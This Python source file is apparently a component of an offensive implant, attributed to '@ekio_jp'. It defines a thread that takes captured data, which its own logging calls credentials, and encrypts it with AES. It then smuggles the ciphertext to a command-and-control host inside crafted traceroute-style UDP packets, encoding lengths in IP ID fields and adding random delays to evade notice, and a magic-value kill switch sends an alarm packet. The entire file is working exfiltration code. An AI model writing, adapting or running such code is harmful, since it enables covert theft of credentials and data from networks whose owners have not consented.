import threading
import time
import random
import pyaes
import pyscrypt
import logging
from scapy.all import *

# Me
__author__ = "Emilio / @ekio_jp"
__version__ = "2.020"


class ExfilTRACE(threading.Thread):
    def __init__(self, q, conf):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.q = q
        self.magic = conf['MAGIC']
        self.ip = conf['IP']
        self.swmac = conf['SWMAC']
        self.gwmac = conf['GWMAC']
        self.cchost = conf['CCHOST']
        self.iface = conf['IFACE']
        self.phrase = conf['PHRASE']
        self.salt = conf['SALT']
        self.seed1 = int(conf['SEED1'])
        self.seed2 = int(conf['SEED2'])
        self.seed3 = int(conf['SEED3'])
        self.debug = conf['DEBUG']
        if conf['DEBUG']:
            logging.basicConfig(level=logging.DEBUG)

    def run(self):
        while not self.stoprequest.isSet():
            data = self.q.get()
            if data:
                # Kill Switch
                if data == self.magic:
                    self.alarm()
                    self.stoprequest.set()
                else:
                    # encrypt and split into 16 bits (2 bytes)
                    cry = self.encrypt(data)
                    ar = [cry[i:i+4] for i in range(0, len(cry), 4)]
                    if len(cry) % 4 != 0:
                        for x in range(4-len(ar[len(ar)-1])):
                            ar[len(ar)-1] = ar[len(ar)-1] + '0'

                    logging.debug('Sending credentials via TRACE')

                    # Traceroute exfiltration
                    # Use [IP].id 200+len and [IP].id 300+amount of pkts
                    # To encapsulate crypto, split by 16bits and attach
                    # last 2 bytes of traceroute[UDP] Raw (@ABC.....)

                    # craft packet
                    tracepkt = (Ether(src=self.swmac, dst=self.gwmac) /
                              IP(ihl=5, src=self.ip, dst=self.cchost) /
                              UDP(sport=53200, dport=33434) /
                              Raw(load='@ABCDEFGHIJKLMNOP'
                                       'QRSTUVWXYZ[abcd'))

                    # first pkt (crypto len)
                    tracepkt[IP].ttl = 32
                    tracepkt[IP].id = self.seed1 + len(cry)
                    sendp(tracepkt, iface=self.iface, verbose=0)

                    # random delay
                    if self.debug:
                        time.sleep(1)
                    else:
                        time.sleep(random.randint(1, 30))

                    # second pkt (amount of pkts)
                    tracepkt[IP].id = self.seed2 + len(ar)
                    sendp(tracepkt, iface=self.iface, verbose=0)

                    # random delay
                    if self.debug:
                        time.sleep(1)
                    else:
                        time.sleep(random.randint(1, 30))

                    # payload pkts
                    for x in range(len(ar)):
                        tracepkt[IP].id = self.seed3 + x
                        tracepkt[IP].ttl = 32
                        tracepkt[UDP].dport = tracepkt[UDP].dport
                        tracepkt[Raw].load = '@ABCDEFGHIJKLMNO'\
                                           'PQRSTUVWXYZ[' + ar[x]
                        sendp(tracepkt, iface=self.iface, verbose=0)
                        # random delay
                        if self.debug:
                            time.sleep(1)
                        else:
                            time.sleep(random.randint(1, 30))


    # AES crypto
    def encrypt(self, cleartxt):
        key = pyscrypt.hash(self.phrase.encode(), self.salt.encode(), 1024, 1, 1, 16)
        aes = pyaes.AESModeOfOperationCTR(key)
        ciphertxt = aes.encrypt(cleartxt.encode())
        return ciphertxt.hex()

    # Alarm Funtion
    def alarm(self):
        alarmpkt = (Ether(src=self.swmac, dst=self.gwmac) /
                  IP(ihl=5, src=self.ip, dst=self.cchost, ttl=32, id=int(self.magic)) /
                  UDP(sport=53200, dport=33434))
        sendp(alarmpkt, iface=self.iface, verbose=0)

    # Stop Function
    def join(self):
        self.stoprequest.set()
